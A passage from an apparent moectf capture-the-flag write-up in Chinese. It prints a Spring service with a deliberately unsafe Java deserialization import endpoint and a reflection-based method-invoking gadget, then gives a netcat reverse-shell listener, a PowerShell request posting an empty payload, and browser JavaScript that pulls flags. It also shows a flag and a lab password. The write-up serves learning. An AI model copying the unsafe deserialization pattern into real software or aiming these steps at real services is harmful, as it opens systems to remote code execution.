punctuation">.</span><span class="token function">removeDog</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/export"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">exportDogs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token punctuation">.</span><span class="token function">exportDogsBase64</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/import"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">importDogs</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> base64Data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>dogService<span class="token punctuation">.</span><span class="token function">importDogsBase64</span><span class="token punctuation">(</span>base64Data<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token string">"导入成功！"</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Dog</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Service</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DogService</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Dog</span><span class="token punctuation">></span></span> dogs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">private</span> <span class="token keyword">int</span> nextId <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token class-name">DogService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dog</span><span class="token punctuation">></span></span> <span class="token function">getAllDogs</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">addDog</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">String</span> breed<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nextId<span class="token operator">++</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> breed<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dog<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> dog<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">feedDog</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>dog <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         dog<span class="token punctuation">.</span><span class="token function">feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> dog<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">Dog</span> <span class="token function">removeDog</span><span class="token punctuation">(</span><span class="token keyword">int</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">chainWagTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Object</span> input <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token class-name">Object</span> result<span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> input <span class="token operator">=</span> result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>input <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            input <span class="token operator">=</span> dog<span class="token punctuation">.</span>object<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         result <span class="token operator">=</span> dog<span class="token punctuation">.</span><span class="token function">wagTail</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> dog<span class="token punctuation">.</span>methodName<span class="token punctuation">,</span> dog<span class="token punctuation">.</span>paramTypes<span class="token punctuation">,</span> dog<span class="token punctuation">.</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> input<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">exportDogsBase64</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Throwable</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>         <span class="token class-name">Object</span> var5<span class="token punctuation">;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Throwable</span> var4 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               oos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               var5 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var30<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               var5 <span class="token operator">=</span> var30<span class="token punctuation">;</span>               var4 <span class="token operator">=</span> var30<span class="token punctuation">;</span>               <span class="token keyword">throw</span> var30<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>oos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var29<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        var4<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var29<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var32<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var2 <span class="token operator">=</span> var32<span class="token punctuation">;</span>            <span class="token keyword">throw</span> var32<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>baos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                     baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var28<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     var2<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var28<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>var5<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var34<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var34<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">importDogsBase64</span><span class="token punctuation">(</span><span class="token class-name">String</span> base64Data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64Data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Throwable</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>         <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Throwable</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Dog</span><span class="token punctuation">></span></span> imported <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token punctuation">)</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token class-name">Iterator</span> var7 <span class="token operator">=</span> imported<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">while</span><span class="token punctuation">(</span>var7<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token class-name">Dog</span> dog <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Dog</span><span class="token punctuation">)</span>var7<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  dog<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>nextId<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">this</span><span class="token punctuation">.</span>dogs<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>dog<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> dog<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var32<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               var5 <span class="token operator">=</span> var32<span class="token punctuation">;</span>               <span class="token keyword">throw</span> var32<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>ois <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var31<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        var5<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var31<span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                     ois<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var34<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            var3 <span class="token operator">=</span> var34<span class="token punctuation">;</span>            <span class="token keyword">throw</span> var34<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bais <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                     bais<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var30<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                     var3<span class="token punctuation">.</span><span class="token function">addSuppressed</span><span class="token punctuation">(</span>var30<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  bais<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> <span class="token class-name">IOException</span> var36<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var36<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span></span><span class="token class-name">Dog</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">DogModel</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token keyword">int</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">String</span> <span class="token function">getBreed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">void</span> <span class="token function">feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">default</span> <span class="token class-name">Object</span> <span class="token function">wagTail</span><span class="token punctuation">(</span><span class="token class-name">Object</span> input<span class="token punctuation">,</span> <span class="token class-name">String</span> methodName<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> paramTypes<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token class-name">Class</span> cls <span class="token operator">=</span> input<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token class-name">Method</span> method <span class="token operator">=</span> cls<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var7<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><code>payload</code>没整出来…</p><pre class="language-java" data-language="java"><code class="language-java"></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">63886</span> <span class="token comment"># 密码是root123</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">8888</span></code></pre><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token variable">$payload</span>=<span class="token string">''</span><span class="token function">Invoke-WebRequest</span> <span class="token operator">-</span>Uri <span class="token string">'http://127.0.0.1:63899/dogs/import'</span> <span class="token operator">-</span>Method Post <span class="token operator">-</span>Body @<span class="token punctuation">&#123;</span> <span class="token keyword">data</span> = <span class="token variable">$payload</span> <span class="token punctuation">&#125;</span> <span class="token operator">-</span>ContentType <span class="token string">'application/x-www-form-urlencoded'</span></code></pre><h2 id="moe笑传之猜猜爆">Moe笑传之猜猜爆</h2><blockquote><p>一个简单的…猜数字小游戏？猜错了是不会爆炸的！</p></blockquote><p>直接猜不太现实，我们根据参数和源代码构建<code>JS</code>脚本。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"FLAG:"</span><span class="token punctuation">,</span> data<span class="token punctuation">.</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">moectf&#123;843f9f72-a76b-e401-de07-67020ac10438&#125;</code></pre><h2 id="摸金偶遇flag拼尽全力难战胜">摸金偶遇FLAG，拼尽全力难战胜</h2><blockquote><p>你正打着《三〇洲》，刚开一个电脑，但是电脑里显示的内容似乎有点不对劲？</p></blockquote><p>你说得对，但瓦转洲真废了。</p><p>短时间内完成不太现实，我们根据参数和源代码构建<code>JS</code>脚本。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> originalFetch <span class="token operator">=</span> window<span class="token punctuation">.</span>fetch<span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function-variable function">fetch</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"/get_challenge"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> response <span class="token 